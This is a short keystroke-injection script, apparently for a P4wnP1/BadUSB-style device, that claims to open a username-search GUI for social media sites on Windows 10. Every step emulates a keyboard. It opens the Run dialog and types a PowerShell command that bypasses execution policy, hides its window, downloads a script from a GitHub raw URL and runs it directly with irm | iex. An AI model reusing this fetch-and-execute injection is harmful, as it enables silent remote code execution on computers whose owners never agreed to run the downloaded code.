// Title: beigeworm's Username Search GUI Tool.
// Author: @beigeworm
// Description: This script creates a GUI for searching social media and other sites with a specified Username.
// Target: Windows 10

// script setup
layout("us")

// Open Powershell and download script
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Social-Search-GUI/main.ps1 | iex");
delay(500);
press("ENTER");
